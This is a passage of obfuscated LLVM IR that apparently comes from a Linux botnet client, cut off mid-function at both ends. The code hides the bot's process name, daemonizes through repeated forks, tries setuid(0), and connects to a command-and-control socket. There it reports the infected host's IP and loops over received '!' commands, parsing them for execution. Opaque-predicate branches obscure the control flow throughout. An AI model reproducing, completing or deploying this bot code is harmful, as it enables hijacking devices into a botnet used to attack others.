  %197 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %19, i32 0, i32 0
  %198 = bitcast %union.anon.5* %197 to [16 x i8]*
  %199 = getelementptr inbounds [16 x i8], [16 x i8]* %198, i32 0, i32 0
  %200 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %201 = call i8* @strcpy(i8* %199, i8* %200) #2
  %202 = load i32, i32* %10, align 4
  %203 = call i32 (i32, i64, ...) @ioctl(i32 %202, i64 35111, %struct.ifreq* %19) #2
  store i32 0, i32* %18, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %127
  %204 = load i32, i32* %18, align 4
  %205 = icmp slt i32 %204, 6
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %146
  %206 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %19, i32 0, i32 1
  %207 = bitcast %union.anon.6* %206 to %struct.sockaddr*
  %208 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %207, i32 0, i32 1
  %209 = getelementptr inbounds [14 x i8], [14 x i8]* %208, i32 0, i32 0
  %210 = load i32, i32* %18, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds i8, i8* %209, i64 %211
  %213 = load i8, i8* %212, align 1
  %214 = load i32, i32* %18, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %215
  store i8 %213, i8* %216, align 1
  br label %originalBB14
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #10
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0), i64 %29) #2
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %37 = call i32 @getpid() #2
  %38 = xor i32 %36, %37
  call void @srand(i32 %38) #2
  %39 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %40 = call i32 @getpid() #2
  %41 = xor i32 %39, %40
  call void @init_rand(i32 %41)
  %42 = call i32 @fork() #2
  store i32 %42, i32* %7, align 4
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %47

; <label>:44:                                     ; preds = %2
  %45 = load i32, i32* %7, align 4
  %46 = call i32 @waitpid(i32 %45, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:47:                                     ; preds = %2
  %48 = load i32, i32* %7, align 4
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %77, label %50

; <label>:50:                                     ; preds = %47
  %51 = load i32, i32* @x.79
  %52 = load i32, i32* @y.80
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %50
  %59 = call i32 @fork() #2
  store i32 %59, i32* %8, align 4
  %60 = icmp ne i32 %59, 0
  %61 = load i32, i32* @x.79
  %62 = load i32, i32* @y.80
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %60, label %69, label %70

; <label>:69:                                     ; preds = %originalBBpart2
  call void @exit(i32 0) #14
  unreachable

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = load i32, i32* %8, align 4
  %72 = icmp ne i32 %71, 0
  br i1 %72, label %74, label %73

; <label>:73:                                     ; preds = %70
  br label %75

; <label>:74:                                     ; preds = %70
  br label %75

; <label>:75:                                     ; preds = %74, %73
  br label %76

; <label>:76:                                     ; preds = %75
  br label %78

; <label>:77:                                     ; preds = %47
  br label %78

; <label>:78:                                     ; preds = %77, %76
  br label %79

; <label>:79:                                     ; preds = %78
  %80 = load i32, i32* @x.79
  %81 = load i32, i32* @y.80
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %79
  %88 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i32 0, i32 0)) #2
  %89 = call i32 @setuid(i32 0) #2
  %90 = call i32 @seteuid(i32 0) #2
  %91 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  %92 = load i32, i32* @x.79
  %93 = load i32, i32* @y.80
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %100

; <label>:100:                                    ; preds = %originalBBpart28, %originalBBpart24
  %101 = call i32 @fork() #2
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %673

; <label>:103:                                    ; preds = %100
  %104 = call i32 @initConnection()
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %106, label %124

; <label>:106:                                    ; preds = %103
  %107 = load i32, i32* @x.79
  %108 = load i32, i32* @y.80
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %106
  %115 = call i32 @sleep(i32 5)
  %116 = load i32, i32* @x.79
  %117 = load i32, i32* @y.80
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %100

; <label>:124:                                    ; preds = %103
  %125 = load i32, i32* @mainCommSock, align 4
  %126 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %127 = call i8* @inet_ntoa(i32 %126) #2
  %128 = call i32 (i32, i8*, ...) @sockprintf(i32 %125, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.113, i32 0, i32 0), i8* %127, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.114, i32 0, i32 0))
  call void @ioctl_keepalive()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %129

; <label>:129:                                    ; preds = %655, %originalBBpart245, %originalBBpart229, %124
  %130 = load i32, i32* @mainCommSock, align 4
  %131 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %132 = call i32 @recvLine(i32 %130, i8* %131, i32 4096)
  store i32 %132, i32* %11, align 4
  %133 = icmp ne i32 %132, -1
  br i1 %133, label %134, label %656

; <label>:134:                                    ; preds = %129
  store i32 0, i32* %12, align 4
  br label %135

; <label>:135:                                    ; preds = %238, %134
  %136 = load i32, i32* %12, align 4
  %137 = sext i32 %136 to i64
  %138 = load i64, i64* @numpids, align 8
  %139 = icmp ult i64 %137, %138
  br i1 %139, label %140, label %241

; <label>:140:                                    ; preds = %135
  %141 = load i32*, i32** @pids, align 8
  %142 = load i32, i32* %12, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds i32, i32* %141, i64 %143
  %145 = load i32, i32* %144, align 4
  %146 = call i32 @waitpid(i32 %145, i32* null, i32 1)
  %147 = icmp sgt i32 %146, 0
  br i1 %147, label %148, label %237

; <label>:148:                                    ; preds = %140
  %149 = load i32, i32* %12, align 4
  %150 = add nsw i32 %149, 1
  store i32 %150, i32* %14, align 4
  br label %151

; <label>:151:                                    ; preds = %199, %148
  %152 = load i32, i32* @x.79
  %153 = load i32, i32* @y.80
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %151
  %160 = load i32, i32* %14, align 4
  %161 = zext i32 %160 to i64
  %162 = load i64, i64* @numpids, align 8
  %163 = icmp ult i64 %161, %162
  %164 = load i32, i32* @x.79
  %165 = load i32, i32* @y.80
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %163, label %172, label %202

; <label>:172:                                    ; preds = %originalBBpart212
  %173 = load i32, i32* @x.79
  %174 = load i32, i32* @y.80
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %172
  %181 = load i32*, i32** @pids, align 8
  %182 = load i32, i32* %14, align 4
  %183 = zext i32 %182 to i64
  %184 = getelementptr inbounds i32, i32* %181, i64 %183
  %185 = load i32, i32* %184, align 4
  %186 = load i32*, i32** @pids, align 8
  %187 = load i32, i32* %14, align 4
  %188 = sub i32 %187, 1
  %189 = zext i32 %188 to i64
  %190 = getelementptr inbounds i32, i32* %186, i64 %189
  store i32 %185, i32* %190, align 4
  %191 = load i32, i32* @x.79
  %192 = load i32, i32* @y.80
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart221, label %originalBB14alteredBB

originalBBpart221:                                ; preds = %originalBB14
  br label %199

; <label>:199:                                    ; preds = %originalBBpart221
  %200 = load i32, i32* %14, align 4
  %201 = add i32 %200, 1
  store i32 %201, i32* %14, align 4
  br label %151

; <label>:202:                                    ; preds = %originalBBpart212
  %203 = load i32*, i32** @pids, align 8
  %204 = load i32, i32* %14, align 4
  %205 = sub i32 %204, 1
  %206 = zext i32 %205 to i64
  %207 = getelementptr inbounds i32, i32* %203, i64 %206
  store i32 0, i32* %207, align 4
  %208 = load i64, i64* @numpids, align 8
  %209 = add i64 %208, -1
  store i64 %209, i64* @numpids, align 8
  %210 = load i64, i64* @numpids, align 8
  %211 = add i64 %210, 1
  %212 = mul i64 %211, 4
  %213 = call noalias i8* @malloc(i64 %212) #2
  %214 = bitcast i8* %213 to i32*
  store i32* %214, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %215

; <label>:215:                                    ; preds = %230, %202
  %216 = load i32, i32* %14, align 4
  %217 = zext i32 %216 to i64
  %218 = load i64, i64* @numpids, align 8
  %219 = icmp ult i64 %217, %218
  br i1 %219, label %220, label %233

; <label>:220:                                    ; preds = %215
  %221 = load i32*, i32** @pids, align 8
  %222 = load i32, i32* %14, align 4
  %223 = zext i32 %222 to i64
  %224 = getelementptr inbounds i32, i32* %221, i64 %223
  %225 = load i32, i32* %224, align 4
  %226 = load i32*, i32** %13, align 8
  %227 = load i32, i32* %14, align 4
  %228 = zext i32 %227 to i64
  %229 = getelementptr inbounds i32, i32* %226, i64 %228
  store i32 %225, i32* %229, align 4
  br label %230

; <label>:230:                                    ; preds = %220
  %231 = load i32, i32* %14, align 4
  %232 = add i32 %231, 1
  store i32 %232, i32* %14, align 4
  br label %215

; <label>:233:                                    ; preds = %215
  %234 = load i32*, i32** @pids, align 8
  %235 = bitcast i32* %234 to i8*
  call void @free(i8* %235) #2
  %236 = load i32*, i32** %13, align 8
  store i32* %236, i32** @pids, align 8
  br label %237

; <label>:237:                                    ; preds = %233, %140
  br label %238

; <label>:238:                                    ; preds = %237
  %239 = load i32, i32* %12, align 4
  %240 = add nsw i32 %239, 1
  store i32 %240, i32* %12, align 4
  br label %135

; <label>:241:                                    ; preds = %135
  %242 = load i32, i32* @x.79
  %243 = load i32, i32* @y.80
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %241
  %250 = load i32, i32* %11, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %251
  store i8 0, i8* %252, align 1
  %253 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %253)
  %254 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %255 = call i8* @strstr(i8* %254, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0)) #10
  %256 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %257 = icmp eq i8* %255, %256
  %258 = load i32, i32* @x.79
  %259 = load i32, i32* @y.80
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br i1 %257, label %266, label %283

; <label>:266:                                    ; preds = %originalBBpart225
  %267 = load i32, i32* @x.79
  %268 = load i32, i32* @y.80
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %266
  %275 = load i32, i32* @x.79
  %276 = load i32, i32* @y.80
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %129

; <label>:283:                                    ; preds = %originalBBpart225
  %284 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %285 = call i8* @strstr(i8* %284, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.115, i32 0, i32 0)) #10
  %286 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %287 = icmp eq i8* %285, %286
  br i1 %287, label %288, label %305

; <label>:288:                                    ; preds = %283
  %289 = load i32, i32* @x.79
  %290 = load i32, i32* @y.80
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %288
  call void @exit(i32 0) #14
  %297 = load i32, i32* @x.79
  %298 = load i32, i32* @y.80
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  unreachable

; <label>:305:                                    ; preds = %283
  %306 = load i32, i32* @x.79
  %307 = load i32, i32* @y.80
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %305
  %314 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %314, i8** %15, align 8
  %315 = load i8*, i8** %15, align 8
  %316 = load i8, i8* %315, align 1
  %317 = zext i8 %316 to i32
  %318 = icmp eq i32 %317, 33
  %319 = load i32, i32* @x.79
  %320 = load i32, i32* @y.80
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br i1 %318, label %327, label %655

; <label>:327:                                    ; preds = %originalBBpart237
  %328 = load i8*, i8** %15, align 8
  %329 = getelementptr inbounds i8, i8* %328, i64 1
  store i8* %329, i8** %16, align 8
  br label %330

; <label>:330:                                    ; preds = %originalBBpart241, %327
  %331 = load i8*, i8** %16, align 8
  %332 = load i8, i8* %331, align 1
  %333 = zext i8 %332 to i32
  %334 = icmp ne i32 %333, 32
  br i1 %334, label %335, label %340

; <label>:335:                                    ; preds = %330
  %336 = load i8*, i8** %16, align 8
  %337 = load i8, i8* %336, align 1
  %338 = zext i8 %337 to i32
  %339 = icmp ne i32 %338, 0
  br label %340

; <label>:340:                                    ; preds = %335, %330
  %341 = phi i1 [ false, %330 ], [ %339, %335 ]
  br i1 %341, label %342, label %361

; <label>:342:                                    ; preds = %340
  %343 = load i32, i32* @x.79
  %344 = load i32, i32* @y.80
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %342
  %351 = load i8*, i8** %16, align 8
  %352 = getelementptr inbounds i8, i8* %351, i32 1
  store i8* %352, i8** %16, align 8
  %353 = load i32, i32* @x.79
  %354 = load i32, i32* @y.80
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br label %330

; <label>:361:                                    ; preds = %340
  %362 = load i8*, i8** %16, align 8
  %363 = load i8, i8* %362, align 1
  %364 = zext i8 %363 to i32
  %365 = icmp eq i32 %364, 0
  br i1 %365, label %366, label %383

; <label>:366:                                    ; preds = %361
  %367 = load i32, i32* @x.79
  %368 = load i32, i32* @y.80
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %366
  %375 = load i32, i32* @x.79
  %376 = load i32, i32* @y.80
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %129

; <label>:383:                                    ; preds = %361
  %384 = load i8*, i8** %16, align 8
  store i8 0, i8* %384, align 1
  %385 = load i8*, i8** %15, align 8
  %386 = getelementptr inbounds i8, i8* %385, i64 1
  store i8* %386, i8** %16, align 8
  %387 = load i8*, i8** %15, align 8
  %388 = load i8*, i8** %16, align 8
  %389 = call i64 @strlen(i8* %388) #10
  %390 = getelementptr inbounds i8, i8* %387, i64 %389
  %391 = getelementptr inbounds i8, i8* %390, i64 2
  store i8* %391, i8** %15, align 8
  br label %392

; <label>:392:                                    ; preds = %428, %383
  %393 = load i8*, i8** %15, align 8
  %394 = load i8*, i8** %15, align 8
  %395 = call i64 @strlen(i8* %394) #10
  %396 = sub i64 %395, 1
  %397 = getelementptr inbounds i8, i8* %393, i64 %396
  %398 = load i8, i8* %397, align 1
  %399 = zext i8 %398 to i32
  %400 = icmp eq i32 %399, 10
  br i1 %400, label %426, label %401

; <label>:401:                                    ; preds = %392
  %402 = load i32, i32* @x.79
  %403 = load i32, i32* @y.80
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %401
  %410 = load i8*, i8** %15, align 8
  %411 = load i8*, i8** %15, align 8
  %412 = call i64 @strlen(i8* %411) #10
  %413 = sub i64 %412, 1
  %414 = getelementptr inbounds i8, i8* %410, i64 %413
  %415 = load i8, i8* %414, align 1
  %416 = zext i8 %415 to i32
  %417 = icmp eq i32 %416, 13
  %418 = load i32, i32* @x.79
  %419 = load i32, i32* @y.80
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBBpart257, label %originalBB47alteredBB

originalBBpart257:                                ; preds = %originalBB47
  br label %426

; <label>:426:                                    ; preds = %originalBBpart257, %392
  %427 = phi i1 [ true, %392 ], [ %417, %originalBBpart257 ]
  br i1 %427, label %428, label %434

; <label>:428:                                    ; preds = %426
  %429 = load i8*, i8** %15, align 8
  %430 = load i8*, i8** %15, align 8
  %431 = call i64 @strlen(i8* %430) #10
  %432 = sub i64 %431, 1
  %433 = getelementptr inbounds i8, i8* %429, i64 %432
  store i8 0, i8* %433, align 1
  br label %392

; <label>:434:                                    ; preds = %426
  %435 = load i8*, i8** %15, align 8
  store i8* %435, i8** %17, align 8
  br label %436

; <label>:436:                                    ; preds = %464, %434
  %437 = load i8*, i8** %15, align 8
  %438 = load i8, i8* %437, align 1
  %439 = zext i8 %438 to i32
  %440 = icmp ne i32 %439, 32
  br i1 %440, label %441, label %446

; <label>:441:                                    ; preds = %436
  %442 = load i8*, i8** %15, align 8
  %443 = load i8, i8* %442, align 1
  %444 = zext i8 %443 to i32
  %445 = icmp ne i32 %444, 0
  br label %446

; <label>:446:                                    ; preds = %441, %436
  %447 = phi i1 [ false, %436 ], [ %445, %441 ]
  %448 = load i32, i32* @x.79
  %449 = load i32, i32* @y.80
  %450 = sub i32 %448, 1
  %451 = mul i32 %448, %450
  %452 = urem i32 %451, 2
  %453 = icmp eq i32 %452, 0
  %454 = icmp slt i32 %449, 10
  %455 = or i1 %453, %454
  br i1 %455, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %446
  %456 = load i32, i32* @x.79
  %457 = load i32, i32* @y.80
  %458 = sub i32 %456, 1
  %459 = mul i32 %456, %458
  %460 = urem i32 %459, 2
  %461 = icmp eq i32 %460, 0
  %462 = icmp slt i32 %457, 10
  %463 = or i1 %461, %462
  br i1 %463, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %447, label %464, label %467

; <label>:464:                                    ; preds = %originalBBpart261
  %465 = load i8*, i8** %15, align 8
  %466 = getelementptr inbounds i8, i8* %465, i32 1
  store i8* %466, i8** %15, align 8
  br label %436

; <label>:467:                                    ; preds = %originalBBpart261
  %468 = load i8*, i8** %15, align 8
  store i8 0, i8* %468, align 1
  %469 = load i8*, i8** %15, align 8
  %470 = getelementptr inbounds i8, i8* %469, i32 1
  store i8* %470, i8** %15, align 8
  %471 = load i8*, i8** %17, align 8
  store i8* %471, i8** %18, align 8
  br label %472

; <label>:472:                                    ; preds = %originalBBpart265, %467
  %473 = load i8*, i8** %18, align 8
  %474 = load i8, i8* %473, align 1
  %475 = icmp ne i8 %474, 0
  br i1 %475, label %476, label %501

; <label>:476:                                    ; preds = %472
  %477 = load i32, i32* @x.79
  %478 = load i32, i32* @y.80
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %476
  %485 = load i8*, i8** %18, align 8
  %486 = load i8, i8* %485, align 1
  %487 = zext i8 %486 to i32
  %488 = call i32 @toupper(i32 %487) #10
  %489 = trunc i32 %488 to i8
  %490 = load i8*, i8** %18, align 8
  store i8 %489, i8* %490, align 1
  %491 = load i8*, i8** %18, align 8
  %492 = getelementptr inbounds i8, i8* %491, i32 1
  store i8* %492, i8** %18, align 8
  %493 = load i32, i32* @x.79
  %494 = load i32, i32* @y.80
  %495 = sub i32 %493, 1
  %496 = mul i32 %493, %495
  %497 = urem i32 %496, 2
  %498 = icmp eq i32 %497, 0
  %499 = icmp slt i32 %494, 10
  %500 = or i1 %498, %499
  br i1 %500, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %472

; <label>:501:                                    ; preds = %472
  store i32 1, i32* %20, align 4
  %502 = load i8*, i8** %15, align 8
  %503 = call i8* @strtok(i8* %502, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0)) #2
  store i8* %503, i8** %21, align 8
  %504 = load i8*, i8** %17, align 8
  %505 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %504, i8** %505, align 16
  br label %506

; <label>:506:                                    ; preds = %553, %501
  %507 = load i8*, i8** %21, align 8
  %508 = icmp ne i8* %507, null
  br i1 %508, label %509, label %555

; <label>:509:                                    ; preds = %506
  %510 = load i32, i32* @x.79
  %511 = load i32, i32* @y.80
  %512 = sub i32 %510, 1
  %513 = mul i32 %510, %512
  %514 = urem i32 %513, 2
  %515 = icmp eq i32 %514, 0
  %516 = icmp slt i32 %511, 10
  %517 = or i1 %515, %516
  br i1 %517, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %509
  %518 = load i8*, i8** %21, align 8
  %519 = load i8, i8* %518, align 1
  %520 = zext i8 %519 to i32
  %521 = icmp ne i32 %520, 10
  %522 = load i32, i32* @x.79
  %523 = load i32, i32* @y.80
  %524 = sub i32 %522, 1
  %525 = mul i32 %522, %524
  %526 = urem i32 %525, 2
  %527 = icmp eq i32 %526, 0
  %528 = icmp slt i32 %523, 10
  %529 = or i1 %527, %528
  br i1 %529, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br i1 %521, label %530, label %553

; <label>:530:                                    ; preds = %originalBBpart269
  %531 = load i8*, i8** %21, align 8
  %532 = call i64 @strlen(i8* %531) #10
  %533 = add i64 %532, 1
  %534 = call noalias i8* @malloc(i64 %533) #2
  %535 = load i32, i32* %20, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %536
  store i8* %534, i8** %537, align 8
  %538 = load i32, i32* %20, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %539
  %541 = load i8*, i8** %540, align 8
  %542 = load i8*, i8** %21, align 8
  %543 = call i64 @strlen(i8* %542) #10
